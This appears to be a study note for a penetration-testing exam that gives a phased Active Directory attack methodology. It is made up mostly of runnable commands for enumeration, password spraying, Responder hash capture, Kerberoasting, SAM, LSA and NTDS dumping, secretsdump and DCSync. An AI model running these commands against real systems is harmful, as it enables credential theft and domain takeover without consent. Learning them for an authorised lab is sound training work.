# AD Attack Methodology

> The AD set is worth 40 points. Follow this progression - each phase open the next.

## Phase 1: No Credentials

> **CRITICAL: Check for web apps on EVERY AD machine first.** Many AD sets start with a web app that gives you initial creds or a foothold. Don't tunnel-vision on SMB/LDAP.

0. **Enumerate ALL services on ALL AD machines** - not just the DC
```bash
nmap -sC -sV -p- -oA nmap/ad-machines $IP1 $IP2 $DC
```
Check HTTP/HTTPS on non-standard ports too (8080, 8443, etc.)

1. **Null session enum**
```bash
nxc smb $IP_RANGE -u '' -p ''
```

2. **RID brute-force** (find usernames from nothing)
```bash
nxc smb $DC -u '' -p '' --rid-brute
```

3. **LDAP anonymous bind**
```bash
ldapsearch -x -H ldap://$DC -b "DC=domain,DC=local"
```
→ [[LDAP-389]]

4. **AS-REP Roasting** (no auth needed, just usernames)
→ [[AS-REP-Roasting]]

5. **SMB shares with null session**
```bash
nxc smb $DC -u '' -p '' --shares
smbclient -N -L //$DC
```
→ [[SMB-139-445]]

6. **Kerbrute user enum**
```bash
kerbrute userenum -d domain.local --dc $DC users.txt
```
→ [[Kerberos-88]]

7. **Password spray discovered users**
→ [[Password-Spraying]]

8. **Responder** (catch forced/coerced authentication - NOT poisoning)
```bash
# Start listener to catch NTLMv2 hashes from forced auth
sudo responder -I tun0
```
Use when you can trigger auth to your IP (xp_dirtree, SSRF, file include to UNC path, PetitPotam, PrinterBug). LLMNR/NBT-NS poisoning is NOT possible on the exam VPN.
Crack captured hashes → [[Hashcat]] mode 5600

---

## Phase 2: Got Credentials

1. **Validate creds**
```bash
nxc smb $DC -u user -p password
```

2. **Enumerate shares**
```bash
nxc smb $DC -u user -p password --shares
```

3. **BloodHound collection** - do this EARLY
→ [[BloodHound]]

4. **Kerberoasting**
→ [[Kerberoasting]]

5. **LDAP dump users + descriptions** (descriptions often contain passwords)
```bash
ldapsearch -x -H ldap://$DC -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description memberOf
```
→ [[LDAP-389]]

6. **Check WinRM access**
```bash
nxc winrm $IP -u user -p password
```
→ [[WinRM-5985]]

7. **Check RDP access**
```bash
nxc rdp $IP -u user -p password
```

8. **Password spray new creds on ALL machines**
```bash
nxc smb targets.txt -u user -p password --continue-on-success
```

9. **Check SQL access**
```bash
nxc mssql $IP -u user -p password
```

---

## Phase 3: Local Admin on a Machine

1. **Dump SAM**
```bash
nxc smb $IP -u admin -p password --sam
```

2. **Dump LSA**
```bash
nxc smb $IP -u admin -p password --lsa
```

3. **Mimikatz / credential dump**
→ [[Lateral-Movement]]

4. **Check for cached domain creds**
```bash
impacket-secretsdump admin:REDACTED
```

5. **Hunt for config files, scripts, scheduled tasks with creds**
```powershell
findstr /si "password" *.xml *.ini *.txt *.cfg
dir /s /b *pass* *cred* *vnc* *.config
```

6. **Pivot to other machines with found creds/hashes**
→ [[Lateral-Movement]]

---

## Phase 4: Domain Admin / DC Compromise

1. **DCSync**
→ [[DCSync]]

2. **Full secrets dump**
```bash
impacket-secretsdump domain/admin:REDACTED
```

3. **Get proof**
```
type C:\Users\Administrator\Desktop\proof.txt
```

---

## Key Reminders

- **Always spray** discovered passwords across ALL machines - EVERY password on EVERY service
- **Check description fields** in LDAP - passwords live there ~50% of the time
- **Credential reuse** is your best friend in AD
- **Run BloodHound early** - it shows paths you'd never find manually
- **Mark owned users** in BloodHound after every new compromise
- **Don't forget NTDS dump** on the DC: `nxc smb $DC -u admin -p pass --ntds`
- **Check GPP passwords**: `nxc smb $DC -u user -p pass -M gpp_autologin` and `nxc smb $DC -u user -p pass -M gpp_password`
- **Check for constrained delegation**: `impacket-findDelegation domain.local/user:REDACTED -dc-ip $DC`
- **Web apps on AD machines are footholds** - don't skip HTTP enumeration on client machines
- **Special characters in passwords**: escape them in bash: `'P@ss!word'` (single quotes) or `P@ss\!word`
